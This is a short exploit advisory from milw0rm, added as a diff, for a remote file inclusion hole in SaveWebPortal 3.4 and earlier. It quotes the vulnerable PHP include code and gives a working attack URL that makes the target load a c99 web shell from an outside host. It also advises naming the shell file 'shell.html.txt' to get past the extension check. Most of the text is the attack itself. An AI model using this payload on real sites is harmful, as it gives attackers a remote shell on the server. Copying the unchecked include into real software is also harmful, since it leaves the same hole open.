@@ -1,0 +1,29 @@
+--------------------------------------------
+SaveWebPortal <= 3.4(page) Remote File Inclusion Vulnerability
+Download:http://www.circeos.it/frontend/theme4/index.php?page=downloads
+--------------------------------------------
+Found by x0rax
+Master9976@hotmail.de
+--------------------------------------------
+Vulnerable Code:
+<?php
+....
+if (strstr ($page, ".php") ||
+                       strstr ($page, ".htm") ||
+                       strstr ($page, ".html")) {
+                       include ("$page");
+....
+?>
+--------------------------------------------
+to inject succesfully you have to create a file called shell.html.txt or
+shell.php.txt
+otherwise it wont work!
+--------------------------------------------
+Affected File:
+index.php =]
+--------------------------------------------
+Vulnerability:
+http://host.com/index.php?page=http://master-boy.cwsurf.de/c99.php.txt
+--------------------------------------------
+
+# milw0rm.com [2006-08-10]
